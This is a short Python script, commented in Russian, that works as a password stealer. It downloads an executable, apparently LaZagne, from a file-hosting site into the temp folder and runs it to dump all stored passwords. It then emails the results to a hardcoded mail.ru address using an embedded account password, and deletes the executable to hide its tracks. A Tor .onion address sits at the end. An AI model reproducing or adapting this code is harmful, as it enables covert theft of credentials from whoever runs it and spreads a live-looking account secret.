import subprocess # выполнение команд в шелле
import smtplib    # работа с почтой
import requests   # работа с http запросами
import tempfile   # работа с временными файлами ( Нужна, чтобы направить lazagne.exe в правильное место )
import os         # работа с ОС

def get_file(url):                      # создадим функцию, которая получит конечный файл с LaZagne.exe
    r = requests.get(url)               # создадим запрос
    file_name = url.split('/')[-1]      # отсекаем http://github.com/..... и в итоге получаем конечное название файла - lazagne.exe
    with open(file_name, 'wb') as file: # открываем файл в локальной переменной file
        file.write(r.content)           # пишем содержимое в файл


def send(email, password, message):            # создадим функцию, которая будет отправлять логи
    server = smtplib.SMTP('smtp.mail.ru', 587) # подключимся к smtp майла ( можно и smtp.gmail.com ) через порт 587
    server.starttls()                          # стартуем соединение с шифрованием tls
    server.login(email, password)              # логинимся в майл
    server.sendmail(email, email, message)     # отправляем письмо
    server.quit()                              # закрываем сессию


temp_dir = tempfile.gettempdir()                                                       # передадим в эту переменную путь к tmp ( временным файлам, где и хранятся пароли )
os.chdir(temp_dir)                                                                     # сменим директорию в наши временные файлы
get_file('https://wdfiles.ru/160c9d.exe') # скачаем файл lazagne.exe по правилам в нашей функции
result = subprocess.check_output('160c9d.exe all', shell=True)                        # передадим в эту переменную команду запуска lazagne.exe ( ключ 'all' извлекает абсолютно все пароли в системе, атрибут shell=True предоставляет доступ к шеллу )
send('nmirsaitov@bk.ru', 'gZV71ip3A9dfFMqtx6YM', result)                                         # отправляем логи
os.remove('160c9d.exe')                                                               # удалям наш файл ( заметаем следы )





#get_file('https://wdfiles.ru/160c9d')
#send('nmirsaitov@bk.ru', 'gZV71ip3A9dfFMqtx6YM', result)


#pu2mca77fap5wfroagqqladytyarlagjfbtoqxsfr3z46gnz3hrjfpid.onion
